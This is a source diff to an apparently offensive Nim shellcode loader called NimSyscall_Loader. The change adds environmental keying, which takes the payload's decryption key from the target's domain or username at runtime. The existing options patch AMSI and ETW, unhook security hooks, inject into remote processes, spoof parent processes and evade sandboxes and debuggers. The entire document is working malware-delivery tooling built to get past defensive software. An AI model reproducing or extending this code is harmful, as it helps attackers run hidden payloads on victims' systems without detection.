@@ -67,7 +67,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -82,6 +82,9 @@ Options:
     --keyfile keyfile  File to read key from
     --dnsKey    Use remote DNS TXT Record as key which is retrieved on runtime
       --dnsdomain sub.example.com    Specify a subdomain to use for the DNS TXT Record
+  --environmentalKey value    Use environmental key (domain,username) to encrypt with
+                              domain -> enumerate the current domain on runtime and use that as key
+                              username -> enumerate the current username on runtime and use that as key
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -258,6 +261,10 @@ var
     kfile: string = ""
     dnsdomain: string = ""
     customKey: bool = false
+    environmentalKey: bool = false
+    environmentalDomain: bool = false
+    environmentalUsername: bool = false
+    environmentalcheckfmt: string = ""
     stegofile: string = ""
     useStego: bool = false
     stFile: string = ""
@@ -358,6 +365,20 @@ if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
   customKey = true
+
+if args["--environmentalKey"]:
+  if(customKey == false):
+    echo "You need to specify the environmental value (domain or username or both) via the --key parameter, otherwise the payload cannot get encrypted via that!"
+    quit(0)
+  environmentalKey = true
+  let environmentalArgs = args["--environmentalKey"]
+  environmentalcheckfmt = fmt"{environmentalArgs}"
+  sandboxchecks = environmentalcheckfmt.split(',')
+  for m in sandboxchecks:
+    if(m.contains("domain")):
+      environmentalDomain = true
+    if(m.contains("username")):
+      environmentalUsername = true
 
 if args["--stegofile"]:
     useStego = true
@@ -872,19 +893,24 @@ if (syswhispers and (threadless or carokann)):
     echo "Error: Cannot use --syswhispers with --threadless/--Caro-Kann (yet)!"
     quit(1)
 
+var
+    firstwithoutlast4: string = ""
+    lastFour: string = ""
+    lastTwo: string = ""
+    fourthtosecondlast: string = ""
 
-
-#echo "Key: " & envkey
-# Lets save the last 4 characters of the string in a new variable
-var lastTwo = envkey[^2..^1]
-var fourthtosecondlast = envkey[^4..^3]
-var lastFour = envkey[^4..^1]
-#echo "Last Four: " & lastFour
-#echo "lastTwo: " & lastTwo
-#echo "fourthtosecondlast: " & fourthtosecondlast
-# And save a key without those last 4 characters in a new one
-var firstwithoutlast4 = envkey.replace(lastFour, "")
-#echo "First without last 4 :" & firstwithoutlast4
+if(not environmentalKey or customKey):
+    #echo "Key: " & envkey
+    # Lets save the last 4 characters of the string in a new variable
+    lastTwo = envkey[^2..^1]
+    fourthtosecondlast = envkey[^4..^3]
+    lastFour = envkey[^4..^1]
+    #echo "Last Four: " & lastFour
+    #echo "lastTwo: " & lastTwo
+    #echo "fourthtosecondlast: " & fourthtosecondlast
+    # And save a key without those last 4 characters in a new one
+    firstwithoutlast4 = envkey.replace(lastFour, "")
+    #echo "First without last 4 :" & firstwithoutlast4
 
 
 # if SkipDefaultSandBoxChecks is set, put firstwithoutlast4 into the keyFile and write it to disk. Otherwise write envkey into it
@@ -1163,6 +1189,8 @@ echo "[*] Enctext length: " & $len(enctext)
 # Convert Key to byte sequence
 #envkey = reverse(envkey)
 var expandedkey = toByteSeq(toHex(envkey))
+echo "[*] Hex key: " & cast[string](toHex(envkey))
+echo "[*] Expanded Hex key: " & repr(expandedkey)
 #expandedkey = toOpenArray(expandedkey).reverse()
 
 
@@ -2292,16 +2320,25 @@ when defined(noKey):
     when defined(webKey):
         # Todo: Implement Web Key
         echo ""
+    when defined(environmentalKey):
+        var envkey: string = ""
+        var envkey2: string = ""
 else:
     when defined(SkipDefaultSandBoxChecks):
         when defined(AntiDebug):
-            var envkey = obf("{firstwithoutlast4}")
+            when defined(customKey):
+                var envkey = obf("{envkey}")
+            else:
+                var envkey = obf("{firstwithoutlast4}")
             var envkey2 = envkey
         else:
             var envkey = obf("{envkey}")
             var envkey2 = obf("{envkey}")
     else:
-        var envkey = obf("{firstwithoutlast4}")
+        when defined(customKey):
+                var envkey = obf("{envkey}")
+        else:
+            var envkey = obf("{firstwithoutlast4}")
         var envkey2 = envkey
 var ptrEncText: ptr byte
 var ptrDecText: ptr byte
@@ -2356,6 +2393,10 @@ let Cryptstub3 = fmt"""
     proc decryptLate(): void =
         #envkey2 = reverse(envkey2)
         var expandedkey = toByteSeq(toHex(envkey2))
+        when defined(verbose):
+            echo obf("[*] Hex key: ") & cast[string](toHex(envkey))
+            echo obf("[*] Expanded Hex key: ") & repr(expandedkey)
+        
         #expandedkey = toOpenArray(expandedkey).reverse()
         discard calcHard()
         if ((int(len(expandedkey)) mod int(aes256.sizeBlock * 2)) != 0):
@@ -3167,6 +3208,31 @@ proc CreatedInterrupt(): bool =
         return true
 """
 
+let DomainKeyStub * = """
+
+envkey = getDomain()
+envkey2 = envkey
+when defined(verbose):
+    echo obf("[*] Domain for the key: "), envkey2
+
+
+"""
+
+let UsernameKeyStub * = """
+
+when defined(environmentalDomain):
+    # concatenate the Username to existing envkey2 value as we enumerate both
+    envkey = envkey & getUsername()
+    envkey2 = envkey
+else:
+    envkey = getUsername()
+    envkey2 = envkey
+
+when defined(verbose):
+    echo obf("[*] Final Key: "), envkey2
+"""
+
+
 var stub = Cryptstub1
 if(macPayload):
     stub.add(macPayloadStub)
@@ -3205,9 +3271,12 @@ stub.add(getRandStubNoTab())
 
 if(sandbox):
     if (not noDInvoke): stub.add(DInvokeSandBoxStub)
+    if(environmentalDomain):
+        stub.add(DomainCheckStub)
     for m in sandboxchecks:
         if(m == "Domain"):
-            stub.add(DomainCheckStub)
+            if (not environmentalDomain): # if we already added it, we don't want to add it again
+                stub.add(DomainCheckStub)
             stub.add(DomainCheckStub1)
         if (m == "DiskSpace"):
             stub.add(DiskSpaceStub)
@@ -3219,6 +3288,13 @@ if(sandbox):
             stub.add(VirtualAlloxExNumaCheckStub)
         if (m == "WindowChanges"):
             stub.add(WindowChangeStub)
+else:
+    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
+    if(environmentalDomain):
+        stub.add(DomainCheckStub)
+    if(environmentalUsername):
+        stub.add(UserNameCheckStub)
+
 if (apihide):
     stub.add(APIHideStub)
 
@@ -3234,6 +3310,11 @@ if(gosleep or remoteETWpatch or remoteAMSIpatch):
 
 stub.add(getRandStubNoTab())
 
+
+if(environmentalDomain):
+    stub.add(DomainKeyStub)
+if(environmentalUsername):
+    stub.add(UsernameKeyStub)
 
 if (syswhispers):
     if(jump):
@@ -3636,7 +3717,10 @@ else:
 if(customKey):
     basicCompileFlags.add("-d:customKey ")
 
-if(usekeyFile or usednsKey or webKey):
+if(environmentalDomain):
+    basicCompileFlags.add("-d:environmentalDomain ")
+
+if(usekeyFile or usednsKey or webKey or environmentalDomain or environmentalUsername):
     basicCompileFlags.add("-d:noKey ")
     if(useKeyFile):
         basicCompileFlags.add("-d:keyFromFile ")
@@ -3644,6 +3728,8 @@ if(usekeyFile or usednsKey or webKey):
         basicCompileFlags.add("-d:dnsKey ")
     elif(webKey):
         basicCompileFlags.add("-d:webKey ")
+    elif(environmentalDomain or environmentalUsername):
+        basicCompileFlags.add("-d:environmentalKey ")
 
 if(stomb):
     basicCompileFlags.add("-d:stomb ")
